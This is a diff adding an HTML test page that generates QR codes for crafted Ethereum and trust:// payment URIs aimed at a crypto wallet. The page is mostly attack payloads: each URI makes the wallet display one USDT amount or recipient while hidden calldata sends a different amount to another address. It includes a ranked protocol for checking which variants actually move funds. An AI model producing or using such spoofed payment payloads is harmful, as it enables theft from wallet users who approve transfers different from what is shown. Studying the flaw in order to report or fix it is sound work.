@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TW v13 — DEFINITIVE Test</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 16px; max-width: 800px; margin: 0 auto; }
+    h1 { font-size: 22px; margin-bottom: 4px; color: #f0883e; }
+    .subtitle { font-size: 13px; color: #8b949e; margin-bottom: 16px; }
+    .critical { background: #161b22; border: 2px solid #f0883e; border-radius: 12px; padding: 14px; margin-bottom: 16px; }
+    .critical h2 { color: #f0883e; font-size: 15px; margin-bottom: 6px; }
+    .critical p { font-size: 12px; color: #c9d1d9; line-height: 1.5; }
+    .critical code { background: #0d1117; padding: 1px 5px; border-radius: 3px; font-size: 11px; color: #7ee787; word-break: break-all; }
+    .test-grid { display: flex; flex-direction: column; gap: 16px; margin-bottom: 16px; }
+    .test-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; }
+    .test-card.priority { border-color: #f0883e; border-width: 2px; }
+    .test-card h3 { font-size: 14px; margin-bottom: 4px; }
+    .test-card .badge { display: inline-block; font-size: 10px; padding: 2px 8px; border-radius: 10px; font-weight: 600; margin-left: 6px; }
+    .badge.attack { background: #da3633; color: white; }
+    .badge.control { background: #238636; color: white; }
+    .badge.probe { background: #1f6feb; color: white; }
+    .test-card .meta { font-size: 11px; color: #8b949e; margin: 6px 0; }
+    .test-card .uri { font-size: 9px; color: #484f58; word-break: break-all; background: #0d1117; padding: 8px; border-radius: 6px; margin: 8px 0; max-height: 60px; overflow-y: auto; font-family: monospace; border: 1px solid #21262d; }
+    .qr-row { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; margin: 8px 0; }
+    .qr-row img { width: 180px; height: 180px; background: white; padding: 8px; border-radius: 8px; }
+    .prediction { font-size: 11px; background: #0d1117; padding: 8px 10px; border-radius: 6px; margin: 6px 0; }
+    .prediction .green { color: #3fb950; }
+    .prediction .red { color: #ff6b6b; }
+    .prediction .yellow { color: #d29922; }
+    .status-bar { background: #21262d; border-radius: 8px; padding: 12px; margin: 16px 0; font-size: 12px; }
+    .status-bar strong { color: #f0883e; }
+  </style>
+</head>
+<body>
+  <h1>🔬 v13 — DEFINITIVE Test</h1>
+  <p class="subtitle">User's exact insight format + all variants in one page</p>
+
+  <div class="critical">
+    <h2>⚡ User's Insight Format</h2>
+    <p>This is the EXACT format given by the user (belmontm):</p>
+    <code>ethereum:0xUSDT@1/transfer?address=0xRECIPIENT&amp;uint256=1000000&amp;data=0xa9059cbb000000000000000000000000&lt;RECIPIENT&gt;00000000000000000000000000000000000000000000000000000000003d0900</code>
+    <p style="margin-top: 8px;">Where <code>uint256=1000000</code> = <strong>1 USDT</strong> (displayed) and <code>data</code> encodes <code>transfer(RECIPIENT, 4000000)</code> = <strong>4 USDT</strong> (executed).</p>
+    <p style="margin-top: 4px;">Wallet shows <strong>1 USDT</strong> on screen → actually transfers <strong>4 USDT</strong>.</p>
+  </div>
+
+  <div class="test-grid">
+
+    <!-- TEST A — User's exact format -->
+    <div class="test-card priority">
+      <h3>Test A ⭐ <span class="badge attack">ATTACK</span></h3>
+      <div class="meta">User's exact EIP-681 /transfer + data — display 1 USDT, execute 4 USDT</div>
+      <div class="qr-row">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D1000000%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR A" loading="lazy">
+      </div>
+      <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=1000000&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+      <div class="prediction">📱 Shows: <span class="green">1 USDT to 0xbc74...</span> | ⚡ Executes: <span class="red">transfer(0xbc74..., 4 USDT) via data override</span></div>
+    </div>
+
+    <!-- TEST B — /transfer uint256=100 (display 100 USDT), data transfers 4 USDT -->
+    <div class="test-card">
+      <h3>Test B <span class="badge attack">ATTACK</span></h3>
+      <div class="meta">Display 100 USDT, execute 4 USDT — bigger spread</div>
+      <div class="qr-row">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D100000000%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR B" loading="lazy">
+      </div>
+      <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=100000000&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+      <div class="prediction">📱 Shows: <span class="green">100 USDT to 0xbc74...</span> | ⚡ Executes: <span class="red">4 USDT (data) — OR — executes 100 USDT (er20)</span></div>
+    </div>
+
+    <!-- TEST C — uint256=0 display, data transfers 4 USDT -->
+    <div class="test-card">
+      <h3>Test C <span class="badge probe">PROBE</span></h3>
+      <div class="meta">Display ZERO USDT, data transfers 4 USDT — does wallet show 0?</div>
+      <div class="qr-row">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D0%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR C" loading="lazy">
+      </div>
+      <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=0&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+      <div class="prediction">📱 Shows: <span class="yellow">0 USDT or "Contract Interaction"</span> | ⚡ Executes: <span class="red">4 USDT if data passes, else 0</span></div>
+    </div>
+
+    <!-- TEST D — /transfer with DIFFERENT recipient in data vs address -->
+    <div class="test-card">
+      <h3>Test D <span class="badge attack">ATTACK</span></h3>
+      <div class="meta">address=RCP1 (shown), data=transfer(RCP2, 4 USDT) — redirect to hidden wallet</div>
+      <div class="qr-row">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266%26uint256%3D1000000%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR D" loading="lazy">
+      </div>
+      <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&uint256=1000000&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+      <div class="prediction">📱 Shows: <span class="green">1 USDT to 0xf39Fd6...</span> | ⚡ Executes: <span class="red">4 USDT to 0xbc74daC (different!)</span></div>
+    </div>
+
+    <!-- TEST E — trust:// format NO amount -->
+    <div class="test-card">
+      <h3>Test E <span class="badge probe">PROBE</span></h3>
+      <div class="meta">trust:// with address=USDT contract, no asset, no amount, pure data</div>
+      <div class="qr-row">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=trust%3A%2F%2Fsend%3Faddress%3D0xdAC17F958D2ee523a2206206994597C13D831ec7%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR E" loading="lazy">
+      </div>
+      <div class="uri">trust://send?address=0xdAC17F958D2ee523a2206206994597C13D831ec7&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+      <div class="prediction">📱 Shows: <span class="yellow">Token picker or "Contract Interaction"</span> | ⚡ Executes: <span class="red">4 USDT if contract_generic passes data</span></div>
+    </div>
+
+    <!-- TEST F — ethereum: without /transfer, pure data -->
+    <div class="test-card">
+      <h3>Test F <span class="badge probe">PROBE</span></h3>
+      <div class="meta">EIP-681 no function, no value, pure data — pure contract interaction</div>
+      <div class="qr-row">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%3Fdata%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR F" loading="lazy">
+      </div>
+      <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1?data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+      <div class="prediction">📱 Shows: <span class="yellow">"Contract Interaction"</span> | ⚡ Executes: <span class="red">4 USDT if data passes through contract_generic</span></div>
+    </div>
+
+    <!-- TEST G — ethereum: value=0 + data -->
+    <div class="test-card">
+      <h3>Test G <span class="badge probe">PROBE</span></h3>
+      <div class="meta">value=0 wei + data — bypass "will fail" check with zero value</div>
+      <div class="qr-row">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%3Fvalue%3D0%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR G" loading="lazy">
+      </div>
+      <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1?value=0&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+      <div class="prediction">📱 Shows: <span class="yellow">"0 ETH + Contract Interaction"</span> | ⚡ Executes: <span class="red">4 USDT if data passes + no revert on value=0</span></div>
+    </div>
+  </div>
+
+  <div class="status-bar">
+    <strong>📋 Testing Protocol:</strong><br>
+    <strong>Priority: A → D → B → G → F → E → C</strong><br><br>
+    <strong>A</strong> = User's exact format (most likely to work)<br>
+    <strong>D</strong> = Different recipient in address param vs data (show X → send to Y)<br>
+    <strong>B</strong> = Big display spread (show 100, send 4)<br>
+    <strong>G</strong> = value=0 no function (pure contract interaction)<br>
+    <strong>F</strong> = Raw no value no function (pure contract_generic)<br>
+    <strong>E</strong> = trust:// without amount (bypasses erc20_transfer)<br>
+    <strong>C</strong> = Zero display amount (uint256=0)<br><br>
+    <span style="color:#f0883e"><strong>For each test, report:</strong></span> What does the wallet SHOW? Is NEXT/CONFIRM enabled? What happens after confirm (gas paid? USDT moved?)?
+  </div>
+
+</body>
+</html>
